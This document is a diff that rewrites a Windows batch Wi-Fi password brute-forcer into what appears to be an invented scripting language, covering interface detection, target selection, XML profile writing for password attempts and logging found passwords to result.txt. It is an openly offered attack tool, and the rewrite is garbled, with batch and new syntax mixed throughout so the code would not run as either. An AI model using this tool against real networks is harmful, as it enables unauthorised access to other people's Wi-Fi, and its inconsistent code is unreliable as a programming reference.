@@ -1,67 +1,69 @@
-@echo off
-:: Batch Wi-Fi Brute Forcer - Developed By TechnicalUserX
-:: Please refer to https://github.com/TechnicalUserX for more projects
-
-:: This program is created to be a proof of concept that it is possible
-:: to write a working Wi-Fi attack tool with Batchfiles since there 
-:: are countless examples on the internet that claims to be legit
-:: hacking tools, working on CMD. While this tool does not claim
-:: a 100% success ratio, it still works if the target Wi-Fi has
-:: weak password. :)
-
-:: There is already a wordlist file in the repository but you are free
-:: to use your own wordlists.
+// Batch Wi-Fi Brute Forcer - Developed By TechnicalUserX
+// Please refer to https://github.com/TechnicalUserX for more projects
+//
+// This program is created to be a proof of concept that it is possible
+// to write a working Wi-Fi attack tool with Batchfiles since there 
+// are countless examples on the internet that claims to be legit
+// hacking tools, working on CMD. While this tool does not claim
+// a 100% success ratio, it still works if the target Wi-Fi has
+// weak password. :)
+//
+// There is already a wordlist file in the repository but you are free
+// to use your own wordlists.
+import * from "unsafe/batch"
+import "fs"
 
 cls
 setlocal enabledelayedexpansion
-title Batch Wi-Fi Brute Forcer
-color 0f
+title "Batch Wi-Fi Brute Forcer"
+color "0f"
 
-cd /D %~dp0
+cd -d %~dp0
 
-if exist "importwifi.xml" (
-    del importwifi.xml
-)
+if fs.exists("importwifi.xml") {
+    del "importwifi.xml"
+}
 
-where wmic 1>nul 2>nul
-if %errorlevel% equ 1 (
-    call :exit_fatal "'wmic' command is not accessible from CMD. Please enable the Windows feature to access 'wmic'"
-)
+where wmic $stdout>null $stderr>null
+if $ERRORLEVEL == 1 {
+    exit_fatal "'wmic' command is not accessible from CMD. Please enable the Windows feature to access 'wmic'"
+}
 
-:: Interface Variables
-set interface_number=0
-set interface_mac=not_defined
-set interface_id=not_defined
-set interface_state=not_defined
-set interface_description=not_defined
-set wifi_target=not_defined
+@entry("Interface Variables") {
+    let interface_number=0
+    let interface_mac=null
+    let interface_id=null
+    let interface_state=null
+    let interface_description=null
+    let wifi_target=null
 
-set attack_counter_option=0
+    let attack_counter_option=0
 
-if not exist "wordlist.txt" (
-    set wordlist_file=not_defined
-) else (
-    set wordlist_file=wordlist.txt
-)
+    if ! fs.exists("wordlist.txt") {
+        let wordlist_file=null
+    }
+    else {
+        let wordlist_file="wordlist.txt"
+    }
+}
 
-
-:program_entry
-    call :interface_init
-    call :mainmenu
-goto :eof
+@entry("program_entry") {
+    interface_init()
+    mainmenu()
+}
 
 :interface_detection
     cls
     echo.
     call :color_echo . yellow "Detecting interfaces..."
     echo.
-    set interface_temp_index=0
-    set interface_number=0
+    var interface_temp_index=0
+    var interface_number=0
 
-    set interface_parse_counter=0
-    set interface_parse_begin=false
-    set interface_parse_line=
-    set interface_parse_arg=
+    let interface_parse_counter=0
+    let interface_parse_begin=false
+    let interface_parse_line
+    let interface_parse_arg
 
     for /f "skip=2 tokens=* delims=" %%a in ('netsh wlan show interfaces ^| findstr /n "^"') do (
         set "interface_parse_line=%%a"
@@ -84,147 +86,151 @@ goto :eof
                 set interface[!interface_temp_index!]_mac=!interface_parse_arg!
             )
 
-            set /a interface_parse_counter=!interface_parse_counter!+1
+            $interface_parse_counter++
         )
 
-        if !interface_parse_counter! gtr 4 (
-            set interface_parse_counter=0
-            set /a interface_temp_index=!interface_temp_index!+1
-            set interface_parse_begin=false
-        )
+        if $interface_parse_counter > 4 {
+            $interface_parse_counter=0
+            $interface_temp_index++
+            $interface_parse_begin=false
+        }
 
-        if "!interface_parse_line!" equ "" (
-            set interface_parse_begin=true
-        )
+        if $interface_parse_line == "" {
+            $interface_parse_begin=true
+        }
 
     )
 
-    rem Last line must be redacted
-    set /a interface_temp_index=!interface_temp_index!-1
+    // Last line must be redacted
+    $interface_temp_index--
 
-    set /a interface_number=!interface_temp_index!+1
-    timeout /t 2 >nul
+    $interface_number = $interface_temp_index + 1
+
+    timeout -t 2 >null
     cls
 goto :eof
 
+@inline
+fn set_color(n: num) {
+    unsafe {<nul set /p=[{{$n}}m}
+}
 
-:color_echo 
+fn color_echo(backgroundColor: str, foregroundColor: str, msg: str) { 
 
-    :: Check if the first 2 arguments are empty, cause they are needed for background/foreground information
-    :: The 3rd argument is not that important because it can be an empty string
-    if "%~1" equ "" (
-        goto :eof
+    // Check if the first 2 arguments are empty, cause they are needed for background/foreground information
+    // The 3rd argument is not that important because it can be an empty string
+    if ! $backgroundColor (
+        return
     )
-    if "%~2" equ "" (
-        goto :eof
-    )
-
-    :: Background color; if invalid, no action
-    if "%~1" equ "black" (
-        <nul set /p=[40m
-    )
-
-    if "%~1" equ "red" (
-        <nul set /p=[41m
+    if ! $foregroundColor (
+        return
     )
 
-    if "%~1" equ "green" (
-        <nul set /p=[42m
-    )
+    // Background color; if invalid, no action
+    if $backgroundColor == "black" {
+        set_color(40)
+    }
 
-    if "%~1" equ "yellow" (
-        <nul set /p=[43m
-    )
+    if $backgroundColor == "red" {
+        set_color(41)
+    }
 
-    if "%~1" equ "blue" (
-        <nul set /p=[44m
-    )
+    if $backgroundColor == "green" {
+        set_color(42)
+    }
 
-    if "%~1" equ "magenta" (
-        <nul set /p=[45m
-    )
+    if $backgroundColor == "yellow" {
+        set_color(43)
+    }
 
-    if "%~1" equ "cyan" (
-        <nul set /p=[46m
-    )
+    if $backgroundColor == "blue" {
+        set_color(44)
+    }
 
-    if "%~1" equ "white" (
-        <nul set /p=[47m
-    )
+    if $backgroundColor == "magenta" {
+        set_color(45)
+    }
 
-    :: Foreground color; if invalid, no action
+    if $backgroundColor == "cyan" {
+        set_color(46)
+    }
 
-    if "%~2" equ "black" (
-        <nul set /p=[30m
-    )
+    if $backgroundColor == "white" {
+        set_color(47)
+    }
 
-    if "%~2" equ "red" (
-        <nul set /p=[31m
-    )
+    // Foreground color; if invalid, no action
 
-    if "%~2" equ "green" (
-        <nul set /p=[32m
-    )
+    if $foregroundColor == "black" {
+        set_color(30)
+    }
 
-    if "%~2" equ "yellow" (
-        <nul set /p=[33m
-    )
+    if $foregroundColor == "red" {
+        set_color(31)
+    }
 
-    if "%~2" equ "blue" (
-        <nul set /p=[34m
-    )
+    if $foregroundColor == "green" {
+        set_color(32)
+    }
 
-    if "%~2" equ "magenta" (
-        <nul set /p=[35m
-    )
+    if $foregroundColor == "yellow" {
+        set_color(33)
+    }
 
-    if "%~2" equ "cyan" (
-        <nul set /p=[36m
-    )
+    if $foregroundColor == "blue" {
+        set_color(34)
+    }
 
-    if "%~2" equ "white" (
-        <nul set /p=[37m
-    )
+    if $foregroundColor == "magenta" {
+        set_color(35)
+    }
 
-    <nul set /p="%~3"
+    if $foregroundColor == "cyan" {
+        set_color(36)
+    }
 
-    <nul set /p=[0m
-goto :eof
+    if $foregroundColor == "white" {
+        set_color(37)
+    }
 
+    unsafe {<nul set /p={{&msg}}}
 
-:interface_init
+    set_color(0)
+}
+
+fn interface_init() {
     cls
-    :: Interface detection and selection
-    call :interface_detection
+    // Interface detection and selection
+    interface_detection()
     echo.
-    call :color_echo . cyan " Interface Init"
+    color_echo("", "cyan", " Interface Init")
     echo.
     echo.
 	if "!interface_number!" equ "1" (
 
-        call :color_echo . yellow " Only '1' Interface Found!"
+        color_echo("", "yellow", " Only '1' Interface Found!")
         echo.
         echo.
-        call :color_echo . white " !interface[0]_description!("
-        call :color_echo . blue "!interface[0]_mac!"
-        call :color_echo . white ")"
+        color_echo . white " !interface[0]_description!("
+        color_echo . blue "!interface[0]_mac!"
+        color_echo("", "white", ")")
         echo.
         echo.
         echo Making !interface[0]_description! the default interface...
         set interface_id=!interface[0]_id!
         set interface_description=!interface[0]_description!
         set interface_mac=!interface[0]_mac!
-        timeout /t 3 >nul
+        timeout -t 3 >null
 	)
 	
-	if !interface_number! gtr 1 (
+	if $interface_number > 1 {
 
         call :color_echo . yellow " Multiple '!interface_number!' Interfaces Found!"
         echo.
-        timeout /t 3 >nul
-        call :interface_selection
+        timeout -t 3 >null
+        interface_selection()
         
-	)
+	}
 	
 	if "!interface_number!"=="0" (
 
@@ -239,10 +245,10 @@ goto :eof
         cls
 	)
 
-goto :eof
+}
 
 
-:interface_selection
+fn interface_selection() {
     cls
     echo.
     call :color_echo . cyan "Interface Selection"
@@ -259,67 +265,63 @@ goto :eof
         call :color_echo . white ")"
         echo.
     )
-    call :color_echo
-    call :color_echo . red "!cancel_index!) Cancel"
+    color_echo
+    color_echo("", "red", "$cancel_index) Cancel")
     echo.
     echo.
 
-    call :program_prompt
+    program_prompt()
 
-    if "!program_prompt_input!" equ "" (
-        call :program_prompt_invalid_input
-        goto :interface_selection
+    if $program_prompt_input == "" (
+        program_prompt_invalid_input()
+        interface_selection()
     )
 
     if !program_prompt_input! leq !interface_number_zero_indexed! (
-        if !program_prompt_input! geq 0 (
+        if !program_prompt_input! >= 0 {
             echo.
             echo Making !interface[%program_prompt_input%]_description! the interface...
             set interface_id=!interface[%program_prompt_input%]_id!
             set interface_description=!interface[%program_prompt_input%]_description!
             set interface_mac=!interface[%program_prompt_input%]_mac!
-            timeout /t 3 >nul
-        ) else (
-            if "!program_prompt_input!" equ "!cancel_index!" (
-                set interface_id=not_defined
-                set interface_description=not_defined
-                set interface_mac=not_defined
-                goto :eof
-            ) else (
-                call :program_prompt_invalid_input
-                goto :interface_selection
-            )
-        )
+            timeout -t 3 >null
+        } else {
+            if $program_prompt_input == $cancel_index {
+                $interface_id=null
+                $interface_description=null
+                $interface_mac=null
+                return
+            } else {
+                program_prompt_invalid_input()
+                interface_selection()
+            }
+        }
     ) else (
 
         if "!program_prompt_input!" equ "!cancel_index!" (
             set interface_id=not_defined
             set interface_description=not_defined
             set interface_mac=not_defined
-            goto :eof
+            return
         ) else (
-            call :program_prompt_invalid_input
-            goto :interface_selection
+            program_prompt_invalid_input()
+            interface_selection()
         )
 
 
     )
+}
 
+fn program_prompt() {
+    color_echo("", "green", " bruteforcer")
+    color_echo("", "white", "$ ")
+    var program_prompt_input = scan()
+}
 
-goto :eof
-
-
-:program_prompt
-    call :color_echo . green " bruteforcer"
-    call :color_echo . white "$ "
-    set /p program_prompt_input=
-goto :eof
-
-
-:program_prompt_invalid_input
-    call :color_echo . red "Invalid input"
-    timeout /t 3 >nul
-goto :eof
+fn program_prompt_invalid_input() {
+    color_echo("", "red", "Invalid input")
+    timeout -t 3 >null
+}
 
 :mainmenu
     cls
@@ -397,7 +399,7 @@ goto :eof
         exit
     )
 
-    call :program_prompt_invalid_input
+    program_prompt_invalid_input()
 goto :mainmenu
 
 
@@ -413,7 +415,7 @@ goto :mainmenu
         goto :eof
     )
 
-    netsh wlan disconnect interface="%interface_id%" > nul
+    netsh wlan disconnect interface="%interface_id%" > null
 
     :scan_wait_disconnected_loop
     call :interface_find_state
@@ -508,7 +510,7 @@ goto :eof
 
 :attack
 
-    set attack_finalize=false
+    let attack_finalize=false
 
     if "!wordlist_file!" equ "not_defined" (
         cls
@@ -521,7 +523,7 @@ goto :eof
     )
 
 
-    if "!wifi_target!" equ "not_defined" (
+    if "!wifi_target!" == "not_defined" (
         cls
         echo.
         call :color_echo . red "Please select a target after scanning..."
@@ -604,19 +606,19 @@ goto :eof
 
 :importwifi_write
 
-    set wifi_target_xml=!wifi_target!
-    set wifi_target_xml=!wifi_target_xml:^&=^&amp;!
-    set wifi_target_xml=!wifi_target_xml:^<=^&lt;!
-    set wifi_target_xml=!wifi_target_xml:^>=^&gt;!
-    set wifi_target_xml=!wifi_target_xml:^"=^&quot;!
-    set wifi_target_xml=!wifi_target_xml:^'=^&apos;!
+    let wifi_target_xml=$wifi_target
+    $wifi_target_xml = $wifi_target_xml.replace("&", "&amp;")
+    $wifi_target_xml = $wifi_target_xml.replace("<", "&lt;")
+    $wifi_target_xml = $wifi_target_xml.replace(">", "&gt;")
+    $wifi_target_xml = $wifi_target_xml.replace("\"", "&quot;")
+    $wifi_target_xml= $wifi_target_xml.replace("'", "&apos;")
 
-    set password_xml=!password!
-    set password_xml=!password_xml:^&=^&amp;!
-    set password_xml=!password_xml:^<=^&lt;!
-    set password_xml=!password_xml:^>=^&gt;!
-    set password_xml=!password_xml:^"=^&quot;!
-    set password_xml=!password_xml:^'=^&apos;!
+    let password_xml=$password
+    $password_xml = $password_xml.replace("&", "&amp;")
+    $password_xml = $password_xml.replace("<", "&lt;")
+    $password_xml = $password_xml.replace(">", "&gt;")
+    $password_xml = $password_xml.replace("\"", "&quot;")
+    $password_xml= $password_xml.replace("'", "&apos;")
 
 
     echo ^<?xml version="1.0"?^> >> importwifi.xml
@@ -651,7 +653,7 @@ goto :eof
 goto :eof
 
 :attack_failure
-    del /Q /F importwifi.xml 2>nul
+    del -Q -F "importwifi.xml" $stderr>null
     cls
     echo.
     call :color_echo . red "Could not find the password"
@@ -662,7 +664,7 @@ goto :eof
 goto :eof
 
 :attack_success
-    del /Q /F importwifi.xml 2>nul
+    del -Q -F "importwifi.xml" $stderr>null
     cls
     echo.
     call :color_echo . green "Found the password"
@@ -676,14 +678,14 @@ goto :eof
     call :color_echo . white "!password!"
     echo.
     call :color_echo . magenta "At attempt : "
-    call :color_echo . white "!password_count!"
+    color_echo("", "white", $password_count)
     echo.
     echo.
 
-    echo Batch Wi-Fi Brute Forcer Result>>result.txt
-    echo Target     : !wifi_target!>>result.txt
-    echo At attempt : !password_count!>>result.txt
-    echo Password   : !password!>>result.txt
+    echo "Batch Wi-Fi Brute Forcer Result">>"result.txt"
+    echo "Target     : $wifi_target">>"result.txt"
+    echo "At attempt : $password_count">>"result.txt"
+    echo "Password   : $password">>"result.txt"
     echo.>>result.txt
     pause
 goto :eof
